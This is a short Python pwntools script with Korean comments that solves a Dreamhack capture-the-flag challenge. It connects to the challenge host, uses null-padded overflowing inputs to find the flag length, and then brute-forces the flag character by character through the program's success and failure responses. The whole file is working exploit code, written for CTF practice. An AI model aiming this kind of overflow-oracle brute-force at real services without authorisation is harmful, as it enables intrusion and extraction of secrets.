#!/bin/usr/python3

from pwn import *

flag_len = 0
for i in range(0x3f, 0, -1):
    # p = process("./checkflag")
    p = remote("host3.dreamhack.games",10078)
    length = b'A'*i + b'\x00'*(0x40-i) + b'A'*i
    p.sendafter(b"flag?", length)
    line = p.recvline()
    if (b"Fail" in line):
        flag_len = i+1 # 1을 더해주어야 함 *******
        print(hex(flag_len))
        p.close()
        break
    else:
        p.close()

flag = list('DH{' + 'A' * (flag_len - 4) + '}') # DH{AAAAAAAAAAA}  #flag = DH{hello world}
for i in range(flag_len - 2, 2, -1):  # 마지막 문자를 제외하려면 flag_len-2로 수정
    for j in range(0x20, 0x7f):
        # p = process("./checkflag")
        p = remote("host3.dreamhack.games",10078)
        
        flag[i] = chr(j) # DH{AAAAAAAAAA_} 맨마지막 문자부터 하나씩 변경 
        payload = ''.join(flag).encode()
        payload += b'\x00'*(0x40 - len(payload)) # 0x40 길이만큼 Null Padding
        payload += ''.join(flag[:i]).encode() # flag값을 한자리만 제외하고 DH{AAAAAAAAAAX} 로 세팅 # 해당 과정을 반복

        p.sendafter(b"flag?", payload)
        line = p.recvline()
        if b"Correct" in line:
            print(''.join(flag))
            p.close()
            break
        p.close()
        
